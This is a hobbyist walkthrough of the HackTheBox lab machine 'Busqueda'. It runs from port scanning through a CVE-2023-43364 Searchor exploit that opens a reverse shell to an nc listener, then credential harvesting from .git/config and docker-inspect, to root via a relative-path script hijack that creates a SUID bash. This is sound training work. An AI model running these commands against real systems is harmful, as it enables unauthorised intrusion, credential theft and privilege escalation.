---
layout: default
title: "Busqueda"
date: 2026-08-24
---
Busqueda - HackTheBox

OS: Linux

Difficulty: Easy

Pawn Date: 24/08/26

---

Recognition
 nmap 
``` nmap -p- -sVC IP ```

Ports Found: 
```22,80```

Enumeration:

They are only 2 open ports, Openssh and Apache. If you connect via http they will
redirect you to ``` http://searcher.htb ```. So i decided to add this domain to my
local DNS on ``` /etc/host ```


If you see the page its basically like a reverse proxy or something, basically is a search
engine that makes and configure URLs to search whatever you want in alot of differents apps.
I tried to use gobuster but nothing worked, until i saw the current version that is under 
the webpage. it says "Powered by Flask and Searchor 2.4.0" so now i knew what i need to do, 
i looked on google to see if theres a CVE for that version of Searchor.


Initial Access:

After i checked on google i found this CVE ```` CVE-2023-43364. ```` the vulnerability allows
us RCE via the unsafe use of ```` eval() ```` that executes arbitrary Python code, so injecting
code in the search query leads to RCE. So now we are going to install a tool on github that is
gonna make all the hard work for us. 

Exploit:

After i searched "CVE-2023-43364 Exploit" i found this github repo ```Herick-Costa
CVE-2023-43364-Searchor-RCE-Exploit``` and after learning how to use it i set my nc listener as
it says ```` nc -lvnp 4444 ```` i ran the exploit ``` python3 CVE-2023-43364.py <URL> <LHOST> ```
and now we got a the reverse shell, as always i upgrade the shell with 
``` python3 -c 'import pty; pty.spawn("/bin/bash")' ``` ```Ctrl + Z``` ``` stty raw -echo; fg ```
``` export TERM=xterm ```. Just like that we can have the user flag by just doing 
``` cat /home/svc/user.txt ```.


Privilege Escalation:

After getting the user flag, i checked the full user directory with ``` ls -la ``` and i saw this
```
drwxr-x--- 6 svc  svc  4096 Apr  8 21:09 
drwxr-xr-x 3 root root 4096 Dec 22 18:56 ..
lrwxrwxrwx 1 root root    9 Feb 20 12:08 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc
drwx------ 2 svc  svc  4096 Feb 28 11:37 .cache
-rw-rw-r-- 1 svc  svc    76 Apr  3 08:58 .gitconfig
drwx------ 3 svc  svc  4096 Apr  8 20:26 .gnupg
drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local
lrwxrwxrwx 1 root root    9 Apr  3 08:58 .mysql_history -> /dev/null
-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
lrwxrwxrwx 1 root root    9 Feb 20 14:08 .searchor-history.json -> /dev/null
drwx------ 3 svc  svc  4096 Apr  8 20:25 snap
-rw-r----- 1 root svc    33 Apr  6 16:56 user.txt
-rw------- 1 svc  svc  1901 Apr  8 21:09 .viminfo
```

The most interesting thing  was ``` .gitconfig ``` so i just checked that too 
```
svc@busqueda:~$ cat .gitconfig 
[user]
        email = cody@searcher.htb
        name = cody
[core]
        hooksPath = no-hooks
```

Then after i didnt found nothing "important" i decided to check more things on other directories
and i found this .git archive:
```
 svc@busqueda:/var/www/app$ cat .git/config 
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
````
this "jh1usoih2bkjaspwe92" looks like a password so i tried ``` sudo -l ``` and... IT works
so, this is what i got 

```
 svc@busqueda:~$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```
We cant run it without arguments bcs of the * so i tried run it with * and it showed this:
```
 Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

I tried all three but only the "full-checkup" didnt work, so after i ran 
``` sudo python3 /opt/scripts/system-checkup.py docker-ps ``` i saw the dockers running 
```
 CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   2 months ago   Up 4 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   2 months ago   Up 4 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

then i tried to inspect the "gitea" docker  ``` svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-inspect gitea ```
but they asked me for a "format" and i didnt know what they were talking about and i made my investigation about what the hell is
dockers and how to use it and whats the "format" thing, after that i knew how to do it. so i ran this 
``` sudo python3 /opt/scripts/system-checkup.py docker-inspect format='{{json .}}' gitea | jq .``` (jq is for pretty print on 
json format btw) 

And i got this:
```
{                                                         
  "Id": "960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb",
  "Created": "2023-01-06T17:26:54.457090149Z",
  "Path": "/usr/bin/entrypoint",                          
  "Args": [
    "/bin/s6-svscan",
    "/etc/s6"
  ],  
...[snip]...
    "Env": [
      "USER_UID=115",
      "USER_GID=121",
      "GITEA__database__DB_TYPE=mysql",
      "GITEA__database__HOST=db:3306",
      "GITEA__database__NAME=gitea",
      "GITEA__database__USER=gitea",
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "USER=git",
      "GITEA_CUSTOM=/data/gitea"                          
    ],  
...[snip]...
```

And if you see i got the user and password for the db, i just need the IP so i ran this
command (that you can find on the documentation)
 
``` sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .NetworkSettings.Networks}}' mysql_db | jq . ```

``` 
  "docker_gitea": {
    "IPAMConfig": null,
    "Links": null,
    "Aliases": [
      "f84a6b33fb5a",
      "db"
    ],
    "NetworkID": "cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227",
    "EndpointID": "4d843a366dbaece32f09158e28a9f41d0a94cf2892455102e2800dcc445e9561",
    "Gateway": "172.19.0.1",
    "IPAddress": "172.19.0.3",
    "IPPrefixLen": 16,
    "IPv6Gateway": "",
    "GlobalIPv6Address": "",
    "GlobalIPv6PrefixLen": 0,
    "MacAddress": "02:42:ac:13:00:03",
    "DriverOpts": null
  }
}
```


With all the info that we need we connect to de DB
```
svc@busqueda:~$ mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh gitea
...[snip]...
mysql>
```

after checking all that i needed we get this 
```
administrator@gitea.searcher.htb ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 
cody@gitea.searcher.htb b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e
```
is the email and the password in hash. In my case i couldnt crack the hash i dont know why but i entered to Gitea as the administrator
because they reused the password from the DB


And after checking the source code of all the scripts on Gitea i saw this:
```
 elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
```

they run ``` full-checkup.sh ``` from the directory that you are so, probably we can make a malicious script 
with the same name and ran it wit root privileges 

Final Explotation:

on the /tmp directory we create the malicious SUID file with the "full-checkup" name:
``` echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/alv\nchmod 4777 /tmp/alv' > full-checkup ```

we change the permissions to be able to execute it:
``` chmod +x full-checkup ```

we run the script with sudo:
``` sudo python3 /opt/scripts/system-checkup.py full-checkup ```
it will say ``` [+] Done! ```

After that we just need to execute it with the flag -p to preserve the root permissions
``` /tmp/alv -p ``` and grab the flag ``` cat /root/root.txt ```

Lessons Learned:

- ALWAYS read the documentation
- theres no a single way to pawn a box
- I learned the basics of dockers
- escalate privileges is not always fast or easy
- credentials found in .git/config or environment variables are often reused
- when a script runs a relative path (./script.sh), you can hijack it from a writable directory
- docker inspect can expose environment variables with sensitive data
